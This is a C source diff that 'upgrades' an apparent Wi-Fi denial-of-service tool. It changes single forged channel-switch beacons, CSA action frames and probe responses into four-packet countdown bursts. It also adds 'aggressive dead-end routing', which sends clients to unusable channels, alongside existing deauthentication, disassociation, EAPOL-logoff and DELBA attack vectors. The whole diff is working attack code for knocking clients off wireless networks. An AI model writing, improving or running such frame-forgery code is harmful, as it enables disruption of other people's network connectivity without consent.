@@ -1585,7 +1585,7 @@ static const uint16_t REASON_CODES[] = {1, 3, 4, 6, 7, 8, 17, 23};
 #define N_REASONS 8
 
 typedef struct {
-  pkt_t csa_beacon;
+  pkt_t csa_beacon[4];
   pkt_t quiet_beacon;
   pkt_t deauth_fwd[N_REASONS];
   pkt_t deauth_rev[N_REASONS];
@@ -1593,9 +1593,9 @@ typedef struct {
   pkt_t disassoc_fwd[N_REASONS];   /* [UPGRADE] Reason code rotation */
   pkt_t disassoc_bcast;
   pkt_t eapol_logoff;
-  pkt_t csa_action;
-  pkt_t probe_resp;    /* unicast to client */
-  pkt_t probe_resp_bc; /* [FIX 8] broadcast variant */
+  pkt_t csa_action[4];
+  pkt_t probe_resp[4];    /* unicast to client */
+  pkt_t probe_resp_bc[4]; /* [FIX 8] broadcast variant */
   pkt_t delba;
   pkt_t confusion;
   pkt_t auth_pool[MAX_AUTH_POOL];
@@ -1635,9 +1635,20 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
 
   uint8_t cur_ch = (uint8_t)t->channel;
 
-  /* [FIX 6] All beacon builders now take cur_ch */
-  f->csa_beacon.len =
-      mk_csa_beacon(f->csa_beacon.buf, bss, t->ssid, cur_ch, (uint8_t)new_ch, 1);
+  /* [UPGRADE] Apply Aggressive Dead-End Routing to Factory Mode */
+  uint8_t aggressive_redir;
+  if (cur_ch <= 14) {
+      aggressive_redir = (cur_ch <= 6) ? 14 : 1;
+  } else {
+      /* In factory mode, if it's 5GHz, use the user's new_ch or default 165 */
+      aggressive_redir = (new_ch > 0) ? (uint8_t)new_ch : 165;
+  }
+
+  /* [UPGRADE] Build Realistic Countdown Burst for Factory Mode */
+  for (int c = 3, idx = 0; c >= 0; c--, idx++) {
+      f->csa_beacon[idx].len =
+          mk_csa_beacon(f->csa_beacon[idx].buf, bss, t->ssid, cur_ch, aggressive_redir, c);
+  }
   f->quiet_beacon.len =
       mk_quiet_beacon(f->quiet_beacon.buf, bss, t->ssid, cur_ch);
 
@@ -1655,14 +1666,17 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
   f->disassoc_bcast.len = mk_disassoc(f->disassoc_bcast.buf, bss, BCAST, 8, 0);
 
   f->eapol_logoff.len = mk_eapol_logoff(f->eapol_logoff.buf, bss, cli);
-  f->csa_action.len =
-      mk_csa_action(f->csa_action.buf, bss, cli, (uint8_t)new_ch, 1);
 
-  /* [FIX 8] Probe response: unicast to client + broadcast */
-  f->probe_resp.len = mk_probe_resp_csa(f->probe_resp.buf, bss, cli, t->ssid,
-                                        cur_ch, (uint8_t)new_ch, 1);
-  f->probe_resp_bc.len = mk_probe_resp_csa(f->probe_resp_bc.buf, bss, BCAST,
-                                           t->ssid, cur_ch, (uint8_t)new_ch, 1);
+  /* [UPGRADE] Burst Countdown for Action and Probe Response */
+  for (int c = 3, idx = 0; c >= 0; c--, idx++) {
+      f->csa_action[idx].len =
+          mk_csa_action(f->csa_action[idx].buf, bss, cli, aggressive_redir, c);
+
+      f->probe_resp[idx].len = mk_probe_resp_csa(f->probe_resp[idx].buf, bss, cli, t->ssid,
+                                            cur_ch, aggressive_redir, c);
+      f->probe_resp_bc[idx].len = mk_probe_resp_csa(f->probe_resp_bc[idx].buf, bss, BCAST,
+                                               t->ssid, cur_ch, aggressive_redir, c);
+  }
 
   f->delba.len = mk_delba(f->delba.buf, bss, cli);
   f->confusion.len = mk_confusion_beacon(f->confusion.buf, t->ssid, cur_ch);
@@ -1716,7 +1730,10 @@ static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
   pkt_set_t s = {.n = 0};
   switch (v) {
   case VEC_CSA_BEACON:
-    s.p[s.n++] = &f->csa_beacon;
+    /* [UPGRADE] Burst Countdown: Hand over all 4 packets (3, 2, 1, 0) */
+    for (int i = 0; i < 4 && s.n < 32; i++) {
+        s.p[s.n++] = &f->csa_beacon[i];
+    }
     break;
   case VEC_QUIET_ELEMENT:
     s.p[s.n++] = &f->quiet_beacon;
@@ -1738,14 +1755,20 @@ static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
     s.p[s.n++] = &f->eapol_logoff;
     break;
   case VEC_CSA_ACTION:
-    s.p[s.n++] = &f->csa_action;
+    /* [UPGRADE] Burst Countdown */
+    for (int i = 0; i < 4 && s.n < 32; i++) {
+        s.p[s.n++] = &f->csa_action[i];
+    }
     break;
   case VEC_BEACON_CONFUSION:
     s.p[s.n++] = &f->confusion;
     break;
   case VEC_PROBE_RESPONSE_CSA:
-    s.p[s.n++] = &f->probe_resp;    /* unicast */
-    s.p[s.n++] = &f->probe_resp_bc; /* broadcast */
+    /* [UPGRADE] Burst Countdown */
+    for (int i = 0; i < 4 && s.n < 30; i++) {
+        s.p[s.n++] = &f->probe_resp[i];    /* unicast */
+        s.p[s.n++] = &f->probe_resp_bc[i]; /* broadcast */
+    }
     break;
   case VEC_DELBA_ATTACK:
     s.p[s.n++] = &f->delba;
